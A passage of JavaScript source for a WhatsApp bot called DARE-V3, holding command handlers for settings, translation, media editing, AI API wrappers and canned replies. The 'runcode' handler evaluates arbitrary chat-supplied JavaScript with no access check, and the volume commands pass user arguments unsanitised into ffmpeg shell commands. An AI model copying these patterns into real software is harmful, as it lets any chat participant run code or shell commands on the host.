        }).join('\n');
        
        replydare(`*Current Settings:*\n${settingsBot}`);  // Return settings list

        // Handle specific commands to toggle settings on/off
        if (text === 'anticall on') {
            db.settings[botNumber].anticall = true;
            replydare('✅ *Anticall Activated*');
        }
        else if (text === 'anticall off') {
            db.settings[botNumber].anticall = false;
            replydare('❌ *Anticall Deactivated*');
        }
        else if (text === 'autobio on') {
            db.settings[botNumber].autobio = true;
            replydare('✅ *Autobio Activated*');
        }
        else if (text === 'autobio off') {
            db.settings[botNumber].autobio = false;
            replydare('❌ *Autobio Deactivated*');
        }
        else if (text === 'autoread on') {
            db.settings[botNumber].autoread = true;
            replydare('✅ *Autoread Activated*');
        }
        else if (text === 'autoread off') {
            db.settings[botNumber].autoread = false;
            replydare('❌ *Autoread Deactivated*');
        }
        else if (text === 'autotype on') {
            db.settings[botNumber].autotyping = true;
            replydare('✅ *Autotype Activated*');
        }
        else if (text === 'autotype off') {
            db.settings[botNumber].autotyping = false;
            replydare('❌ *Autotype Deactivated*');
        }
        else if (text === 'antiswview on') {
            db.settings[botNumber].readsw = true;
            replydare('✅ *Read SW Activated*');
        }
        else if (text === 'antiswview off') {
            db.settings[botNumber].readsw = false;
            replydare('❌ *Read SW Deactivated*');
        }
    } else {
        replydare('⚠️ *You are not authorized to view or change settings.*');
    }
}
break;

case 'translate': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    if (!q) return replydare(`*❓ Where is the text?*\n\n📌 *Example usage:*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`);
        await loading()

    const defaultLang = 'en';
    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    if (!text && m.quoted && m.quoted.text) text = m.quoted.text;

    try {
        let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null);
        if (!result || !result.text) return replydare('⚠️ Translation failed. Please try again.');

        const caption = `🌐 *Translated Text:* ${result.text}\n\n*🔤 From:* ${text}\n*🔠 To:* ${lang}`;
        const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

        // Send the message with the image URL directly
        await Dare.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: caption,
            mentions: [m.sender]
        }, { quoted: m });

    } catch (e) {
        console.error('Error in translation:', e);
        replydare('⚠️ An error occurred. Please try again later.');
    }
}
break;

  case 'volaudio': {
if (!args.join(" ")) return replydare(`Example: ${prefix + command} 10`)
reply(mess.wait)               
media = await Dare.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replydare('Error!')
jadie = fs.readFileSync(rname)
Dare.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
        
case 'volvideo': {
if (!args.join(" ")) return replydare(`Example: ${prefix + command} 10`)
reply(mess.wait)
media = await Dare.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replydare('Error!')
jadie = fs.readFileSync(rname)
Dare.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break

case 'runcode': {
    if (!text) return replydare(`Example: ${prefix + command} <JavaScript code>`);

    try {
        // Variable to capture console output
        let consoleOutput = '';
        const customConsole = {
            log: (...args) => {
                consoleOutput += args.join(' ') + '\n'; // Capture console.log output
            }
        };

        // Wrap the code execution in a Function and pass in the custom console
        const codeFunction = new Function('console', text);
        let result = codeFunction(customConsole); // Execute the code

        // If the result is a Promise (async code), await it
        if (result instanceof Promise) {
            result = await result;
        }

        // Prepare the output message
        const output = consoleOutput ? `\n🖥️ *Console Output:*\n\`\`\`${consoleOutput}\`\`\`` : '';
        const resultMessage = result !== undefined ? `\n✅ *Execution Result:*\n\`\`\`${result}\`\`\`` : '';

        replydare(`${resultMessage}${output || ''}`);
    } catch (error) {
        // Return an error message if execution fails
        replydare(`❌ *Error:* \n\`\`\`${error.message}\`\`\``);
    }
}
break;

case 'p': {
    let timestamp = speed();
    let latensi = speed() - timestamp;
    neww = performance.now();
    oldd = performance.now();

    const respon = `
✨ *Bot Response Status* ✨\n
📡 *Response Speed*: \n ${latensi.toFixed(4)} _seconds_
🕒 *Ping*: \n ${oldd - neww} _milliseconds_
⏱ *Runtime*: \n ${runtime(process.uptime())}
🗄 *RAM Usage*: \n ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
\n🎉 *Keeping the bot in top shape!*
`.trim();

    replydare(respon);
}
break;

case 'speedtest':
case 'speed': {
    replydare('⚡ Testing Speed... ⚡');
    let cp = require('child_process');
    let { promisify } = require('util');
    let exec = promisify(cp.exec).bind(cp);
    let o;
    
    try {
        o = await exec('python3 speed.py');
    } catch (e) {
        o = e;
    } finally {
        let { stdout, stderr } = o;
        if (stdout.trim()) replydare(`🌟 Test Results 🌟\n\n${stdout}`);
        if (stderr.trim()) replydare(`⚠️ Error:\n${stderr}`);
    }
}
break;

case 'write': {
				replydare(`*Example*\n${prefix}writeleft text\n${prefix}writeright text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
                
			case 'writeleft': {
				if (!text) return replydare(`Send command *${prefix + command}* text`)
				reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/write/images/book/afterleft.jpg'
				])
				.on('error', () => replydare(mess.error))
				.on('exit', () => {
					Dare.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
                
			case 'writeright': {
				if (!text) return replydare(`Send command *${prefix + command}* text`)
				reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/write/images/book/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/write/images/book/afterright.jpg'
				])
				.on('error', () => replydare(mess.error))
				.on('exit', () => {
					Dare.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/book/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break

	case 'folioleft': {
				if (!text) return replydare(`Send command *${prefix + command}* text`)
				reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeleft.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replydare(mess.error))
				.on('exit', () => {
					Dare.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterleft.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break
                
			case 'folioright': {
				if (!text) return replydare(`Send command *${prefix + command}* text`)
				reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/write/images/folio/beforeright.jpg',
					'-font',
					'./src/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/write/images/folio/afterright.jpg'
				])
				.on('error', () => replydare(mess.error))
				.on('exit', () => {
					Dare.sendMessage(m.chat, { image: fs.readFileSync('./src/write/images/folio/afterright.jpg'), caption: 'Here you go!' }, { quoted: m })
				})
			}
			break

//▄▀▄ ▀█▀   █▀▀ █▀█ █▄ ▄█ █▄ ▄█ ▄▀▄ █▀▄ █▄ █ █▀▀ 
//█▀█ ▄█▄   █▄▄ █▄█ █ ▀ █ █ ▀ █ █▀█ █▄▀ █ ▀█ ▄██ 


case 'blackboxai': {
  if (!text) return replydare(`⚡ *Example:* ${prefix + command} write a program to delete a file 📝`);
  try {
    let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json();
    const reply = `🔥 *Blackbox AI Response* 🔥\n\n💡 *Result:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;
    const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

    await Dare.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });
  } catch (e) {
    console.error('Error:', e);
    return replydare(`❗ *Error:* ${e.message} ⚠️`);
  }
}
break;

case 'travel-assistant': {
  if (!text) return replydare(`✈️ *Example:* ${prefix + command} how can I visit the Taj Mahal 🏰`);
  try {
    let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json();
    if (gpt.status === "error") {
      return replydare(`❌ *Error:* ${gpt.message}`);
    }
    const reply = `🌍 *Travel Assistant AI* 🌍\n\n🗺️ *Your Request:* ${text}\n\n💬 *Response:* ${gpt.result}`;
    const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

    await Dare.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });
  } catch (e) {
    console.error('Error:', e);
    return replydare("⚠️ *Error* ⚠️");
  }
}
break;
                
case 'dalle': {
  if (!text) return replydare(`🎤 *• Example:* ${prefix + command} a girl singing in public 🎶`);

  try {
      const apiUrls = [
          'https://aemt.uk.to/dalle?text=',
          'https://meitang.xyz/dalle?text=',
          'https://btch.us.kg/dalle?text=',
          'https://api.tioo.eu.org/dalle?text=',
          'https://api.tioprm.eu.org/dalle?text='
      ];
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
      let response = await fetch(randomApiUrl + encodeURIComponent(text));

      if (!response.ok) return replydare('❌ Failed to fetch the image. Please try again.');

      let gptImageUrl = await response.json();

      if (!gptImageUrl || !gptImageUrl.url) return replydare('❌ No image found. Please try again with a different prompt.');

      await Dare.sendMessage(m.chat, {
          image: { url: gptImageUrl.url },
          caption: `> Dalle 🌟 \n\n _*Here is the result of: ${text} ✨*_`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replydare("`*Error*`");
  }
}
break;

case 'stablediffusion': {
  if (!text) return replydare(`🎨 *• Example:* ${prefix + command} school boy 👦`);

  try {
      const apiUrls = [
          'https://aemt.uk.to/stablediffusion?text=',
          'https://meitang.xyz/stablediffusion?text=',
          'https://btch.us.kg/stablediffusion?text=',
          'https://api.tioo.eu.org/stablediffusion?text=',
          'https://api.tioprm.eu.org/stablediffusion?text='
      ];
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
      const timeout = new Promise((_, reject) =>
          setTimeout(() => reject(new Error('⏳ Request timeout')), 15000)
      );

      let response = await Promise.race([
          fetch(randomApiUrl + encodeURIComponent(text)),
          timeout
      ]);

      if (!response.ok) return replydare('❌ *Failed to fetch the image.* Please try again. 🔄');

      let imageUrl = await response.json();

      if (!imageUrl || !imageUrl.url) return replydare('❌ *No image found.* Please try again with a different prompt. 🔄');

      await Dare.sendMessage(m.chat, {
          image: { url: imageUrl.url },
          caption: `✨ *Stable Diffusion* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 🖌️`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replydare(`❗ *Error:* ${e.message} ⚠️`);
  }
}
break;

case 'lexica': {
    if (!text) return replydare(`📸 *• Example:* ${prefix + command} a cat 🐱`);

    try {
        const timeout = new Promise((_, reject) =>
            setTimeout(() => reject(new Error('⏳ Request timeout')), 15000)
        );

        let response = await Promise.race([
            fetch(`https://api.maher-zubair.xyz/ai/lexica?apikey=${global.id}&prompt=${encodeURIComponent(text)}`),
            timeout
        ]);

        if (!response.ok) return replydare('❌ *Failed to fetch the image.* Please try again. 🔄');

        let data = await response.json();

        if (!data.result) return replydare('❌ *No image found.* Please try again with a different prompt. 🔄');

        await Dare.sendMessage(m.chat, {
            image: { url: data.result },
            caption: `✨ *Lexica AI* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 🖌️`
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        return replydare(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;

case 'photoleap': {
    if (!text) return replydare(`🌊 *Example:* ${prefix + command} blue sea`);

    const currentTime = Date.now();
    if (currentTime - (global.lastUsedPhotoleap || 0) < 10000) {
        return replydare("⏳ Cooldown 10 seconds, try again later");
    }
    global.lastUsedPhotoleap = currentTime;

    try {
        let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${encodeURIComponent(text)}`)).json();

        if (!gpt.result_url) return replydare('❌ *No image found.* Please try again with a different prompt. 🔄');

        const reply = `✨ *Photo Leap AI* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 📷`;

        await Dare.sendMessage(m.chat, {
            image: { url: gpt.result_url },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replydare(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;
                
case 'ai': case 'gpt': case 'openai': {
    if (!text) return replydare(`*• Example:* ${prefix + command} what is your name`);

    try {
        const apiUrls = [
            'https://aemt.uk.to/openai?text=',
            'https://meitang.xyz/openai?text=',
            'https://btch.us.kg/openai?text=',
            'https://api.tioo.eu.org/openai?text=',
            'https://api.tioprm.eu.org/openai?text='
        ];
        const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
        let response = await fetch(randomApiUrl + encodeURIComponent(text));

        if (!response.ok) return replydare('❌ *Failed to fetch the response.* Please try again. 🔄');

        let gpt = await response.json();

        if (!gpt.result) return replydare('❌ *No result found.* Please try again with a different prompt. 🔄');

        const reply = `🌟 *OpenAI Response* 🌟\n\n💬 *Response:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;

        await Dare.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/128g9s.jpg' },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replydare(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;

case 'ai2': case 'gpt2': case 'openai2': {
  if (!text) return replydare(`Example: ${prefix + command} query`)
  const hasil = await chatGpt(text);
   return replydare(`❗ *Error:*⚠️`);
}
break



case 'checkgpt': {
    if (!text) return replydare(`*• Example:* ${prefix + command} input your text`);

    try {
        let apiUrl = `${global.api}ai/text-detector?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);

        if (!response.ok) return replydare('❌ Failed to analyze the text. Please try again.');

        let data = await response.json();

        const feedback = `*🤖 GPT Text Analysis*\n\n`
            + `*📝 Input Text:* \n_${data.result.input_text}_\n\n`
            + `*🌐 Detected Language:* \n_${data.result.detected_language}_\n\n`
            + `*💡 AI Detection Feedback:* \n_${data.result.feedback}_\n\n`
            + `*📊 AI Likelihood:* \n_${data.result.isHuman}% likely human-generated_\n\n`
            + `*💬 Additional Feedback:* \n_${data.result.additional_feedback}_\n`;

        await Dare.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/128g9s.jpg' },
            caption: feedback,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replydare("❗ *Error analyzing the text. Please try again.*");
    }
}
break;

case 'darky': {
    if (!text) return replydare(`*• Example:* ${prefix + command} write me a simple code of python`);

    try {
        let response = await (await fetch(`https://evlgpt.onrender.com/egpt?prompt=${encodeURIComponent(text)}`)).json();

        let message = response.message.replace(/GURUGPT V1/g, 'DARE-V3');

        const reply = `🔥 *DARE-V3 AI Response* 🔥\n\n💡 *Result:* ${message}\n\n📝 *Your Request:* ${text}`;

        await Dare.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/128g9s.jpg' },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error('Error:', e);
        return replydare("❗ *Error*");
    }
}
break;

case 'bing': {
  if (!text) return replydare(`*• Example:* ${prefix + command} hello`);

  // Define API URLs
  const apiUrls = [
    'https://aemt.uk.to/bingai?text=',
    'https://meitang.xyz/bingai?text=',
    'https://btch.us.kg/bingai?text=',
    'https://api.tioo.eu.org/bingai?text=',
    'https://api.tioprm.eu.org/bingai?text='
  ];

  try {
    // Choose a random API URL from the list
    const apiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)] + encodeURIComponent(text);
    
    // Fetch data from the selected API
    let response = await (await fetch(apiUrl)).json();
    
    // Prepare the response text with emojis
    const reply = `🔥 *DARE-V3 AI Response* 🔥\n\n💬 *Response:* ${response.result}\n\n📝 *Your Request:* ${text}`;

    // Image URL to use
    const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

    // Send the message with the image URL and the reply text
    await Dare.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });

  } catch (e) {
    console.error('Error:', e);
    return replydare("❗ *Error*");
  }
}
break;

case 'chatgpt': {
    if (!text) {
        reply('Please ask me something!');
        return;
    }

    try {
        const apiUrl = `https://api.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(text)}`;


        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        
        if (jsonData.success && jsonData.result) {
            reply(jsonData.result); 
        } else {
            reply('Failed to fetch response from the API. Please try again later.');
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        reply('An error occurred while fetching the AI response. Please try again later.');
    }
    break;
}

case 'mathsai': {
  if (!text) return replydare(`*• Example:* ${prefix + command} what is your name`);
  
  try {
    // Fetch data from the Maths AI API
    let gpt = await (await fetch(`${global.api}ai/math?apikey=${global.id}&prompt=${text}`)).json();

    // Prepare the message with the response
    const reply = `🔥 *Maths AI Response* 🔥\n\n🧮 *Result:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;

    // Image URL to use
    const imageUrl = 'https://files.catbox.moe/128g9s.jpg';

    // Send the message with the image URL and the reply text
    await Dare.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });

  } catch (e) {
    console.error('Error:', e);
    return replydare("❗ *Error occurred while processing the math query.*");
  }
}
break;


case 'mangaimg': {
  if (!text) return replydare(`*• Example:* ${prefix + command} a manga character 🖼️`);

  await reply(mess.wait)

  try {
      // Fetch the manga image from the API
      let apiUrl = `${global.api}ai/manga-diffusion?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replydare('❌ Failed to fetch the image. Please try again.');
      }

      // Convert the response to a buffer
      const buffer = await response.buffer();

      // Prepare the message to send
      const caption = `> Manga Image 🎨\n\n_*Here is the result of: ${text} 🌟*_`;

      // Send the image and caption
      await Dare.sendMessage(m.chat, {
          image: { buffer },
          caption: caption
      }, { quoted: m });

      await Dare.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (e) {
      console.error(e);
      await Dare.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
      return replydare("❗ Error fetching the image. Please try again.");
  }
}
break;

case 'animeimg': {
  if (!text) return replydare(`*• Example:* ${prefix + command} a cute anime girl 👧✨`);

  await reply(mess.wait)

  try {
      // Fetch the anime image from the API
      let apiUrl = `${global.api}ai/anime-gen?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replydare('❌ Failed to fetch the image. Please try again.');
      }

      // Convert the response to a buffer
      const buffer = await response.buffer();

      // Prepare the caption for the image
      const caption = `> Anime Image 🎥\n\n_*Here is the result of: ${text} 🌟*_`;

      // Send the image and caption
      await Dare.sendMessage(m.chat, {
          image: { buffer },
          caption: caption
      }, { quoted: m });

      await Dare.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (e) {
      console.error(e);
      await Dare.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
      return replydare("❗ Error fetching the image. Please try again.");
  }
}
break;

case 'low': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `😪`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HELLO @${sender.split("@")[0]}    
   I AM AT MY LOWEST🥺🚨`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/sajiuu.opus'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'pic': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    if (!text) {
        return reply(`*Usage:* .pic <prompt>\n\n*Example:* .pic dog`);
    }

    try {
        
        const apiUrl = `https://api.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;
        
        
        await Dare.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `🎨 *pic Image Generator*\n\n📄 *Prompt:* ${text}\n\n> MADE BY DARE-V3`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Flux command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

case 'bot': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `👨‍💻`, key: m.key } });

    const owned = `6285745522549@s.whatsapp.net`;
    const textMessage = `> YA @${sender.split("@")[0]}
    I'D LET THE WORLD BURN 🔥💥`;

    const audioUrl = 'https://files.catbox.moe/coau2a.opus'; // Replace with your audio URL
    const imageUrl = 'https://files.catbox.moe/evvoto.jpg'; // Replace with your image URL

    // Send a single message combining text, audio, and image
    await Dare.sendMessage(m.chat, { 
        caption: textMessage, 
        image: { url: imageUrl }, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true, 
            externalAdReply: { 
                title: 'DARE-V3 BOT IS ONLINE', 
                body: 'I WAS MADE BY B.M.B', 
                mediaType: 2, 
                mediaUrl: imageUrl, 
                thumbnailUrl: imageUrl 
            } 
        }, 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });

    break;
}

case 'thanos':
case 'help': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🤲`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HELLO @${sender.split("@")[0]}    
   𝙷𝙴𝚈 ?¿ , 𝙳𝙴𝙰𝚃𝙷 𝙸𝚂 INEVITABLE🤍`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/2ww74m.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'pray': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🤲`, key: m.key } });

    const owned = `6285745522549@s.whatsapp.net`;
    const textMessage = `> YA @${sender.split("@")[0]}
    
*OH WHO CLAIMS TO UNDERSTAND 🤔*
*OH BROTHER, HOW LONG WILL YOU BE DELUDED? 😔*  
*YOU TIRE YOURSELF WITH SIN AND DISGRACE, YOU MAKE MISTAKE AFTER MISTAKE*
*DO YOU NOT FEEL ASHAMED? 😢*

*HAS NOT YOUR OLD AGE WARNED YOU? ⏳*  
*FOR CERTAINLY, THERE IS NO DOUBT ABOUT ITS ADVICE, BUT YOUR HEARING HAS NOT HEARD.*  

*HAS NOT DEATH CALLED YOU? ☠️*
*HAVE YOU NOT HEARD THE VOICE? 📢*
*ARE YOU NOT AFRAID YOUR TIME IS RUNNING OUT? ⌛*  

*SO BE WARNED AND TAKE HEED. ⚠️*  
*FOR HOW NEEDY ARE YOU IN NEEDINESS, AND YET YOU STRUT IN ARROGANCE? 😤*  
*AND YOU FOCUS ON HAVING FUN 🕺 AS IF DEATH IS A MYTH. 🌀*`;

    const audioUrl = 'https://files.catbox.moe/vwlbas.opus'; // Replace with your audio URL
    const imageUrl = 'https://files.catbox.moe/lf167c.jpg'; // Replace with your image URL

    // Send the image with caption and attach the audio
    await Dare.sendMessage(m.chat, { 
        image: { url: imageUrl }, 
        caption: textMessage, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });

    break;
}

case 'bible': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
  const { translate } = require('@vitalets/google-translate-api')
  const BASE_URL = 'https://bible-api.com'

  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }

    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);

    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }

    let chapterData = await chapterRes.json();

    // Translate the chapter content into Hindi and English
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })

    // Format the Bible chapter message
    let bibleChapter = `📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`

    // Send the formatted message using replydare
    return replydare(bibleChapter)

  } catch (error) {
    replydare(`Error: ${error.message}`)
  }
 }     
  break
  
case 'tf':
case 'threaten': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🔪`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HELLO @${sender.split("@")[0]}    
   𝐃𝐎𝐍𝐓 𝐃𝐀𝐑𝐄 𝐌𝐄 😡😈💀`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/piipnl.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'bye': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `👋`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > DEAR @${sender.split("@")[0]}    
 𝐈 𝐆𝐔𝐄𝐒𝐒 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐖𝐇𝐄𝐑𝐄 𝐈𝐓 𝐄𝐍𝐃𝐒 😞, 𝚃𝙸𝙻𝙻 𝚆𝙴 𝙼𝙴𝙴𝚃 𝙰𝙶𝙰𝙸𝙽 𝚖𝚊𝚝𝚎 😖`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/jtipd0.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'byelove': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `👋`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > DEAR @${sender.split("@")[0]}    
 𝐈 𝐆𝐔𝐄𝐒𝐒 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐖𝐇𝐄𝐑𝐄 𝐈𝐓 𝐄𝐍𝐃𝐒 🤧, 𝙸 𝚆𝙸𝙻𝙻 𝙰𝙻𝚆𝙰𝚈𝚂 𝙲𝙷𝙴𝚁𝙸𝚂𝙷 𝚈𝙾𝚄 💔⛈`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
